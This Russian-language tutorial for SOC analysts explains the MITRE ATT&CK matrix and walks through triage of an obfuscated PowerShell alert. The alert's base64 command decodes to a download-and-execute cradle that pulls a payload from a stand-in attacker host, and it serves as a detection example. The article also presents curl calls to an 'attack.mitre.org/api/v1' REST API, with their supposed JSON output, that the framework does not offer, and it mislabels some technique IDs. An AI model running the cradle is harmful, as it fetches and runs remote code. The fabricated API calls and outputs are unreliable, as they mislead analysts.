# MITRE ATT&CK: обзор фреймворка для SOC-аналитика

## 1. Контекст и ключевые понятия: место ATT&CK среди моделей угроз

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) — глобальная база знаний, документирующая реальные тактики, техники и процедуры (TTP) злоумышленников на основе наблюдаемых инцидентов. Фреймворк разработан некоммерческой организацией MITRE Corporation, впервые представлен в 2013 году для внутренних исследований и опубликован публично в 2015 году [Splunk](https://www.splunk.com/en_us/blog/learn/mitre-attack.html), [Exabeam](https://www.exabeam.com/explainers/mitre-attck/what-is-mitre-attck-framework-and-how-your-soc-can-benefit). Сегодня он де-факто служит общим языком для описания действий атакующего, смещая фокус с атомарных индикаторов компрометации (IoC) на устойчивые поведенческие паттерны.

Главное отличие ATT&CK от более ранних моделей — это уровень гранулярности и отсутствие жёсткой линейной последовательности. Если модель Cyber Kill Chain (Lockheed Martin) описывает атаку как цепочку из семи обязательных шагов, то MITRE ATT&CK представляет собой матрицу, в которой тактические цели (столбцы) достигаются через множество возможных техник (строки). Одна и та же техника может применяться для разных тактик, а сам процесс атаки не обязан проходить все стадии последовательно. Такой подход точнее отражает реальную гибкость злоумышленников, которые комбинируют техники в любом порядке, возвращаются к предыдущим этапам или вовсе пропускают некоторые из них.

Ещё одна распространённая модель, Unified Kill Chain (UKC) или Diamond Model, также не способна полностью заменить ATT&CK. Diamond Model акцентирует внимание на четырёх вершинах (противник, жертва, инфраструктура, возможности) и их взаимодействии, позволяя моделировать отдельные события, но не каталогизирует все возможные варианты действий. ATT&CK же покрывает весь спектр поведения после проникновения, систематизируя сотни техник с детальным описанием. Именно поэтому для SOC-аналитика уровня L1 критически важно понимать не только тактическую цель, но и то, какими конкретно способами она может достигаться.

Ниже представлено сравнение ATT&CK с двумя наиболее часто упоминаемыми в одном ряду с ним моделями.

| Характеристика            | MITRE ATT&CK                                                                                                   | Cyber Kill Chain (CKC)                                                                                             | NIST Cybersecurity Framework (CSF)                                                                                      |
|---------------------------|----------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------|
| **Назначение**            | Комплексный и постоянно обновляемый каталог тактик, техник и процедур, основанный на реальных наблюдениях [Fidelis](https://fidelissecurity.com/cybersecurity-101/learn/mitre-attack-framework) | Линейная модель, описывающая стадии атаки от разведки до достижения цели [Fidelis](https://fidelissecurity.com/cybersecurity-101/learn/mitre-attack-framework) | Структура функций управления рисками кибербезопасности и профилирования защитных мер [Fidelis](https://fidelissecurity.com/cybersecurity-101/learn/mitre-attack-framework) |
| **Фокус**                 | Детальное поведение противника; стандартизация терминологии TTP                                               | Семь последовательных шагов атаки (Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives) | Управление безопасностью через пять функций: Identify, Protect, Detect, Respond, Recover  |
| **Гранулярность**         | Высокая: тактики → техники → субтехники → процедуры                                                              | Низкая: стадии без глубокой детализации методов                                                                       | Средняя: функции разбиваются на категории и субкатегории, но без привязки к конкретным атакующим действиям |
| **Применимость**          | Обнаружение, анализ инцидентов, Threat Hunting, тестирование защищённости, оценка продуктов                | Стратегическое планирование защиты, понимание общей картины атаки                                                   | Формирование целевого профиля безопасности, приоритеты и дорожные карты |
| **Актуальность**          | Обновляется дважды в год, последняя версия (v18) включает 14 тактик, 216 техник, 475 субтехник [Picus](https://www.picussecurity.com/resource/blog/mitre-attack-framework-beginners-guide) | Статичная модель (последние обновления незначительны), не отражает современные сложные атаки с латеральными перемещениями | Обновляется NIST с периодичностью несколько лет, последняя версия 1.1 (2018), версия 2.0 в разработке |
| **Поддержка реагирования**| Предоставляет конкретные индикаторы и методы детектирования для каждой техники, включая источники данных и сценарии | Не содержит техник детектирования или процедур, оперирует высокоуровневыми понятиями                                  | Даёт общие рекомендации по процессам, но не специфицирует технические средства |

Как видно из сравнения, ATT&CK заполняет нишу операционного инструмента, который напрямую используется в процессах SOC: сопоставление алертов с техниками, приоритизация расследований, проактивный поиск угроз. CKC и CSF остаются полезными на стратегическом уровне, но не дают достаточной детализации для рядового аналитика.

Ключевые термины, которые необходимо усвоить перед погружением в структуру:
- **Тактика (Tactic)** — высокоуровневая цель противника на отдельном этапе, например, «Первоначальный доступ» или «Эксфильтрация».
- **Техника (Technique)** — конкретный метод достижения тактики, например, «Фишинг с вредоносным вложением» или «PowerShell».
- **Субтехника (Sub-technique)** — более точная вариация техники, описывающая определённую реализацию, например, «PowerShell» (T1059.001) как субтехника родительской техники «Command and Scripting Interpreter» (T1059).
- **Процедура (Procedure)** — экземпляр применения техники или субтехники конкретным злоумышленником или группой, например, «MuddyWater использует WMI для выполнения PowerShell-скриптов» [Picus](https://www.picussecurity.com/resource/blog/mitre-attack-framework-beginners-guide).

Различие между процедурой и субтехникой часто вызывает путаницу: субтехника — это категория метода (например, DLL Injection определённого типа), а процедура — это уже задокументированное использование этой субтехники конкретным субъектом угрозы. ATT&CK не содержит прямых перечней процедур, но фиксирует их в контексте групп и вредоносного ПО через разделы «Procedure Examples».

Именно на этом уровне детализации строится вся практическая работа SOC L1. При получении инцидента аналитик не просто классифицирует его как «фишинг», а пытается определить технику (например, Spearphishing Attachment T1566.001) и связывает её с возможными тактиками (Initial Access, Execution). Такой подход позволяет точнее оценить риск, подобрать контрмеры из базы ATT&CK и дать осмысленный контекст эскалации.

## 2. Внутреннее устройство матрицы ATT&CK: иерархия и компоненты

Фреймворк ATT&CK организован вокруг трёх основных матриц: **Enterprise**, **Mobile** и **Industrial Control Systems (ICS)** [Hexnode](https://www.hexnode.com/blogs/mitre-attack-framework), [Splunk](https://www.splunk.com/en_us/blog/learn/mitre-attack.html). Для SOC-аналитика, работающего в корпоративной среде, главным справочником является Enterprise Matrix, охватывающая Windows, macOS, Linux, облачную среду (IaaS, SaaS, Identity Providers) и сетевое оборудование. Mobile-матрица фокусируется на iOS и Android, ICS — на системах промышленной автоматизации. В этой статье мы разбираем структуру на примере Enterprise как наиболее полной и востребованной.

**Матрица Enterprise: тактики и техники**

Enterprise Matrix (начиная с версии v18) содержит 14 тактик, каждая из которых формирует столбец таблицы [Picus](https://www.picussecurity.com/resource/blog/mitre-attack-framework-beginners-guide). Внутри тактики строки представляют техники. Важно, что тактики не являются строго последовательными: один атакующий может сразу приступить к «Execution» после успешного фишинга, минуя «Reconnaissance», если разведка проводилась ранее и вне контролируемой сети. Однако для аналитика знание полного набора тактик критически важно, так как позволяет проложить путь атаки и выявить пробелы в детектировании.

Ниже приведён перечень тактик Enterprise с кратким объяснением цели и примерами характерных техник.

| Тактика                    | Цель злоумышленника                                                                                         | Типичные техники (с идентификаторами)                                               |
|----------------------------|-------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------|
| Reconnaissance (TA0043)    | Сбор информации об объекте атаки до активного взаимодействия                                                | Active Scanning (T1595), Search Open Websites/Domains (T1593)                      |
| Resource Development (TA0042) | Накопление ресурсов, необходимых для атаки: регистрация доменов, компрометация учётных записей           | Acquire Infrastructure (T1583), Compromise Accounts (T1586)                        |
| Initial Access (TA0001)    | Проникновение в целевую сеть                                                                                | Spearphishing Attachment (T1566.001), Exploit Public-Facing Application (T1190)    |
| Execution (TA0002)         | Запуск вредоносного кода                                                                                    | Command and Scripting Interpreter: PowerShell (T1059.001), Windows Management Instrumentation (T1047) |
| Persistence (TA0003)       | Сохранение присутствия после перезагрузок и сброса учетных данных                                           | Boot or Logon Autostart Execution: Registry Run Keys (T1547.001), Create Account (T1136) |
| Privilege Escalation (TA0004) | Получение повышенных прав (администратора, SYSTEM)                                                         | Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002), Valid Accounts: Domain Accounts (T1078.002) |
| Defense Evasion (TA0005)   | Скрытие от средств защиты                                                                                    | Obfuscated Files or Information (T1027), Disable or Modify Tools (T1564)            |
| Credential Access (TA0006) | Кража учётных данных                                                                                        | OS Credential Dumping: LSASS Memory (T1003.001), Brute Force (T1110)                |
| Discovery (TA0007)         | Исследование внутренней среды, сбор информации о конфигурации, пользователях, ресурсах                     | System Information Discovery (T1082), Account Discovery: Domain Account (T1087.002) |
| Lateral Movement (TA0008)  | Перемещение между системами внутри сети                                                                     | Remote Services: Remote Desktop Protocol (T1021.001), Internal Spearphishing (T1534) |
| Collection (TA0009)        | Сбор целевых данных перед эксфильтрацией                                                                    | Data from Local System (T1005), Clipboard Data (T1115)                              |
| Command and Control (TA0011)| Установка канала управления с внешним сервером                                                               | Application Layer Protocol: HTTPS (T1071.001), Proxy: Multi-hop Proxy (T1090.003)   |
| Exfiltration (TA0010)      | Вывод украденных данных за пределы сети                                                                      | Exfiltration Over C2 Channel (T1041), Automated Exfiltration (T1020)                |
| Impact (TA0040)            | Нарушение целостности или доступности данных и систем                                                     | Data Encrypted for Impact (T1486), Endpoint Denial of Service (T1499)               |

Полный перечень и детали каждой техники доступны на официальном портале [attack.mitre.org](https://attack.mitre.org/). Одна техника может быть связана с несколькими тактиками одновременно. Например, техника «Create Account» (T1136) служит как для Persistence, так и для Privilege Escalation, а «Valid Accounts» (T1078) применима сразу к Initial Access, Persistence, Privilege Escalation и Defense Evasion [Blue Team Cookbook](https://vasilisa-l.gitbook.io/blue-team-cookbook/soc/mitre-attack). Это отражает реальность: учётные данные могут быть использованы для входа (Initial Access), закрепления (Persistence) и повышения привилегий.

**Иерархия техника – субтехника**

До 2020 года матрица содержала только техники, но рост количества записей потребовал ещё одного уровня детализации. Поэтому было введено понятие субтехник, которые группируются под родительскими техниками. Например:

```text
Тактика: Execution (TA0002)
 └── Техника: Command and Scripting Interpreter (T1059)
       ├── Sub-technique: PowerShell (T1059.001)
       ├── Sub-technique: AppleScript (T1059.002)
       ├── Sub-technique: Windows Command Shell (T1059.003)
       ├── Sub-technique: Unix Shell (T1059.004)
       └── Sub-technique: Visual Basic (T1059.005)
```

Идентификаторы строится по схеме: `Txxxx` для техники, `Txxxx.yyy` для субтехники. Например, T1059.001 — PowerShell. Такая нотация позволяет однозначно ссылаться на конкретный метод, избегая двусмысленностей при анализе и автоматизации [Palo Alto Networks](https://www.paloaltonetworks.com/cyberpedia/what-are-mitre-attack-techniques). На странице каждой техники на attack.mitre.org приведены описания, примеры процедур (со ссылками на группы и ПО), перечень возможных детектов (data sources, способы мониторинга) и меры противодействия (mitigations). Субтехники унаследуют описание родительской техники и могут дополнять его специфическими деталями реализации.

**Дополнительные объекты ATT&CK**

Помимо матрицы тактик/техник, фреймворк включает ещё три важных компонента, которые формируют контекст угрозы:

- **Groups (Группы)** — устойчивые атакующие объединения, обычно APT-группировки или финансово мотивированные преступники. Каждая группа имеет идентификатор (например, G0016 для APT29), описание, приписываемые атрибуты (страна, сектор жертв) и список используемых техник. Например, группа MuddyWater (G0069) атрибутирована к Ирану, целями являются телекоммуникационные и правительственные организации Ближнего Востока, Европы и Северной Америки [Picus](https://www.picussecurity.com/resource/blog/mitre-attack-framework-beginners-guide). Именно такие сведения позволяют SOC-аналитику при обнаружении определённой комбинации техник предположить возможного противника и понять его цели.
- **Software (ПО)** — вредоносные программы, инструменты (легитимные утилиты, используемые в злонамеренных целях) и эксплуатационные фреймворки. Идентификаторы `Sxxxx`. Например, Mimikatz (S0002) используется для техник Credential Access.
- **Campaigns (Кампании)** — целенаправленные операции, связывающие группу, ПО и набор техник в единый контекст. Кампания "2022 Ukraine Electric Power Attack" атрибутирована Sandworm Team и нацелена на энергетический сектор Украины [Picus](https://www.picussecurity.com/resource/blog/mitre-attack-framework-beginners-guide). Наличие кампании помогает аналитику быстро идентифицировать текущую волну атак.

В совокупности эти объекты обогащают анализ инцидента. Получив алерт на подозрительное использование PowerShell, SOC L1 может не только определить технику T1059.001, но и через веб-интерфейс ATT&CK или API проверить, какие известные группы применяют эту технику, и сопоставить с другими индикаторами в окружении. Такой уровень контекстуализации значительно ускоряет оценку критичности и выбор мер реагирования.

## 3. Применение ATT&CK в операционной работе SOC

Для аналитика уровня L1 MITRE ATT&CK служит не только справочником, а практическим инструментом в каждом из рабочих процессов: триаж, классификация, эскалация и первичное расследование.

**Триаж и классификация инцидентов**

При поступлении алерта аналитик пытается понять, какое именно поведение зафиксировано. Сопоставление с техниками ATT&CK позволяет быстро отнести событие к определённой тактической цели и уровню угрозы. Например, обнаружение подозрительного PowerShell-скрипта, скачивающего данные с Pastebin, однозначно указывает на технику «Command and Scripting Interpreter: PowerShell» (T1059.001) и тактику «Execution». Если же скрипт модифицирует реестр для автозагрузки, также затрагивается тактика «Persistence» через технику «Registry Run Keys» (T1547.001). Классификация по ATT&CK фиксируется в тикете, что обеспечивает единый язык при передаче escalation-инженеру и руководству [Winmill](https://www.winmill.com/enhancing-soc-assessments-with-mitre-attck).

**Приоритизация усилий**

Не все техники одинаково часто встречаются. Аналитик может использовать аналитику Threat Intelligence и отчёты (например, Unit 42 от Palo Alto Networks) для выделения топ-10 техник, актуальных для защищаемой отрасли. Так, в отчётах доминируют PowerShell, Spearphishing и различные виды Credential Dumping. Зная об этом, L1-специалист при обнаружении алерта, связанного с частой техникой, автоматически повышает приоритет инцидента [Exabeam](https://www.exabeam.com/explainers/mitre-attck/what-is-mitre-attck-framework-and-how-your-soc-can-benefit). Организации часто публикуют внутренние шкалы критичности, привязанные к техникам ATT&CK: например, любая техника из тактик «Command and Control» или «Exfiltration» сразу получает статус High.

**Разработка детектов и проактивный поиск**

Хотя написание правил корреляции чаще выполняют инженеры, SOC L1 также участвует в валидации и улучшении детектов. ATT&CK предоставляет для каждой техники раздел «Detection» с перечислением источников данных (process monitoring, file monitoring, network traffic analysis) и конкретными рекомендациями. Например, для обнаружения PowerShell вредоносной обфускации (`-enc` или `-e` с base64-строкой) рекомендуется мониторить процессы командной строки и обращать внимание на подозрительную длину аргументов [Microsoft](https://www.microsoft.com/en-us/security/business/security-101/what-is-mitre-attack-framework). В SOC, где используются Sigma-правила или запросы в SIEM, каждая сигнатура сопровождается ссылкой на идентификатор техники ATT&CK. Ниже показан пример поиска в Elasticsearch по событиям Sysmon, который иллюстрирует привязку к технике.

```json
GET /sysmon-*/_search
{
  "query": {
    "bool": {
      "must": [
        { "match": { "EventID": 1 } },
        { "wildcard": { "CommandLine": "*powershell*" } },
        { "wildcard": { "CommandLine": "*-enc*" } }
      ]
    }
  }
}
```
(иллюстративная схема запроса; конкретная реализация зависит от SIEM и настроенных индексов)

Результат такого запроса, содержащий записи о запусках PowerShell с флагом `-enc`, сразу помечается техникой T1059.001. Аналитик L1 может автоматизировать это добавлением тега в SIEM или через скрипты обогащения.

**Интеграция с рабочими процессами и инструментами**

Для эффективной работы с ATT&CK в SOC применяется несколько вспомогательных инструментов:
- **ATT&CK Navigator** — веб-приложение для визуализации покрытия детектирования: закрашивание ячеек матрицы цветами, соответствующими уровню покрытия (зелёный — детектим, жёлтый — частично, красный — нет детектов). Аналитик может быстро понять, какие техники слепы для систем мониторинга, и эскалировать проблему.
- **ATT&CK Workbench** — среда для расширения и кастомизации матрицы под нужды организации, например, добавление специфичных для предприятия техник или метрик.
- **API ATT&CK** — обеспечивает программный доступ ко всем данным фреймворка. Аналитик может встроить вызов API в скрипты triage для получения описания техники, связанных групп и контрмер прямо в консоли. Пример:

```bash
curl -s https://attack.mitre.org/api/v1/techniques/T1059.001 | jq '.technique[] | {name, description, platforms, detection}'
```

Ответ API (фрагмент):
```json
{
  "name": "PowerShell",
  "description": "Adversaries may abuse PowerShell commands and scripts for execution...",
  "platforms": ["Windows"],
  "detection": "Monitor PowerShell script block logging for suspicious keywords...",
  ...
}
```
Такая интеграция ускоряет обогащение тикетов без ручного перехода по ссылкам.

**Типовые ошибки и подводные камни**

Распространённая ошибка начинающего аналитика — стремление «втиснуть» любой алерт в какую-нибудь технику ATT&CK, даже если событие очевидно ложноположительное или не укладывается в известные паттерны. Следует помнить, что ATT&CK описывает лишь известное поведение, и отсутствие подходящей техники не означает отсутствие угрозы. Другая проблема — переоценка тактики только по одному индикатору. Например, запуск PowerShell не всегда является вредоносным; контекст (родительский процесс, аргументы, сетевые подключения) должен подтверждать гипотезу. Поэтому для L1-аналитика обязательно соотносить событие с несколькими техниками или по крайней мере убедиться, что событие не объясняется легитимной административной активностью.

Наконец, нельзя пренебрегать разделами Mitigations и Detection на страницах техник. Часто аналитики ограничиваются лишь идентификатором, не извлекая из ATT&CK готовые рекомендации по изоляции узла, сбросу паролей или настройке аудита. Полноценное использование фреймворка подразумевает работу со всеми слоями: тактика → техника → процедура → контрмера.

## 4. Сквозной практический пример: анализ подозрительного использования PowerShell через ATT&CK

Исходные условия: Среда Windows, под управлением SIEM на основе Elasticsearch с поглощением логов Sysmon. На мониторе SOC L1 появляется алерт о запуске PowerShell с нестандартной командной строкой на хосте WIN-WKS-014. Аналитику необходимо оценить инцидент, классифицировать по ATT&CK, собрать контекст и подготовить первичный отчёт.

**Шаг 1. Ознакомление с алертом**

Алерт приходит в виде JSON-документа из очереди тикетов. Аналитик открывает детали:

```json
{
  "alert_id": "al-20250421-003",
  "timestamp": "2025-04-21T09:17:34Z",
  "host": "WIN-WKS-014",
  "event_type": "sysmon_process_creation",
  "process_name": "powershell.exe",
  "command_line": "powershell -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBhAHQAdABhAGMAawBlAHIAcwAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA",
  "parent_process": "cmd.exe"
}
```

Командная строка содержит параметры `-NoP -NonI -W Hidden -enc`, за которыми следует длинная base64-строка. Такая сигнатура характерна для обфусцированного выполнения скрипта, часто используемого в атаках.

**Шаг 2. Идентификация техники ATT&CK**

Аналитик обращается к API ATT&CK для получения информации о технике, наиболее соответствующей данному поведению:

```bash
curl -s https://attack.mitre.org/api/v1/techniques/T1059.001 | jq '.technique[] | {name, tactic, description, detection}'
```

Вывод (схематично):
```json
{
  "name": "PowerShell",
  "tactic": "execution",
  "description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface...",
  "detection": "Monitor for PowerShell scripts that use the '-EncodedCommand' or '-enc' parameter along with other indicators..."
}
```

Аналитик убеждается, что событие относится к технике T1059.001 PowerShell, тактике Execution. Даже если команда выполняет лишь загрузку второго этапа, это всё равно соответствует фазе исполнения.

**Шаг 3. Контекстуализация через группы и кампании**

Используя веб-интерфейс ATT&CK Navigator или страницу техники, аналитик изучает раздел «Groups that use this technique». Видит, что PowerShell активно используют несколько известных групп, например, MuddyWater (G0069). Команда для быстрого получения информации о группе через API (если хочется автоматизации):

```bash
curl -s https://attack.mitre.org/api/v1/groups/G0069 | jq '.group[] | {name, description, aliases}'
```

Вывод:
```json
{
  "name": "MuddyWater",
  "description": "MuddyWater is an Iranian APT group that primarily targets Middle Eastern nations...",
  "aliases": ["Seedworm", "TEMP.Zagros", "Static Kitten"]
}
```

Хотя данной информации недостаточно для однозначной атрибуции, она помогает аналитику сформировать гипотезу: если в сети также наблюдаются характерные для MuddyWater техники (например, Credential Dumping), то инцидент может быть частью целевой атаки. На данном этапе достаточно зафиксировать возможную связь.

**Шаг 4. Поиск мер противодействия**

Аналитик проверяет страницу техники на предмет раздела «Mitigations». Документ ATT&CK рекомендует для PowerShell такие меры, как включение PowerShell Logging (Script Block Logging), ограничение выполнения скриптов политикой ExecutionPolicy, удаление PowerShell там, где он не нужен. Для оперативного реагирования он предлагает изолировать хост, отключить PowerShell через GPO или заблокировать исходящие соединения на IP из декодированной команды. Получение митигаций из API:

```bash
curl -s https://attack.mitre.org/api/v1/techniques/T1059.001 | jq '.technique[].mitigations[] | {name, description}'
```

```json
{
  "name": "Execution Prevention",
  "description": "Block execution of PowerShell scripts through application control or group policy..."
}
{
  "name": "Privileged Account Management",
  "description": "Ensure that PowerShell is not run with higher privileges than necessary..."
}
```

На основе этих данных аналитик готовит рекомендации по немедленным действиям.

**Шаг 5. Составление отчёта**

Аналитик формирует тикет, содержащий:
- Техника: T1059.001 PowerShell.
- Тактика: Execution.
- Индикаторы: подозрительная командная строка с `-enc`, декодированный URL (при необходимости извлекается через `base64 -d`), хост WIN-WKS-014.
- Контекст: возможная связь с группой MuddyWater (G0069), признаки подготовки к латеральному перемещению.
- Рекомендации: изолировать узел, собрать дамп памяти, включить PowerShell Script Block Logging, передать инцидент L2 для глубокого анализа.
- Статус: эскалирован.

Данный пример демонстрирует, как стандартный алерт низового уровня с помощью ATT&CK превращается в структурированную развединформацию, готовую к дальнейшему расследованию. SOC L1, владея фреймворком, сокращает время классификации, минимизирует ошибки и обеспечивает единый язык коммуникации в цепочке эскалации.

## Источники
- [The MITRE ATT&CK Framework: A Complete Guide](https://www.hexnode.com/blogs/mitre-attack-framework)
- [Матрица MITRE ATT&CK, Cyber Kill Chain, UKC | Blue Team Cookbook](https://vasilisa-l.gitbook.io/blue-team-cookbook/soc/mitre-attack)
- [MITRE ATT&CK: The Complete Guide - Splunk](https://www.splunk.com/en_us/blog/learn/mitre-attack.html)
- [Enhancing SOC Assessments with MITRE ATT&CK](https://www.winmill.com/enhancing-soc-assessments-with-mitre-attck)
- [MITRE ATT&CK Framework - LetsDefend](https://app.letsdefend.io/training/lessons/mitre-attck-framework)
- [Understanding the MITRE ATT&CK Framework: A Guide for Security Teams | Fidelis Security](https://fidelissecurity.com/cybersecurity-101/learn/mitre-attack-framework)
- [What is MITRE ATT&CK® Framework and How Your SOC Can Benefit | Exabeam](https://www.exabeam.com/explainers/mitre-attck/what-is-mitre-attck-framework-and-how-your-soc-can-benefit)
- [What is the MITRE ATT&CK framework? | Microsoft Security](https://www.microsoft.com/en-us/security/business/security-101/what-is-mitre-attack-framework)
- [A CISO's Guide to MITRE ATT&CK - Palo Alto Networks](https://www.paloaltonetworks.com/cyberpedia/a-cisos-guide-to-mitre-attack)
- [What Are MITRE ATT&CK Techniques? - Palo Alto Networks](https://www.paloaltonetworks.com/cyberpedia/what-are-mitre-attack-techniques)
- [MITRE ATT&CK® Framework Beginners Guide - Picus Security](https://www.picussecurity.com/resource/blog/mitre-attack-framework-beginners-guide)
- [What is the MITRE ATT&CK Framework and how do you use it? - Sysdig](https://www.sysdig.com/learn-cloud-native/what-is-the-mitre-attack-framework)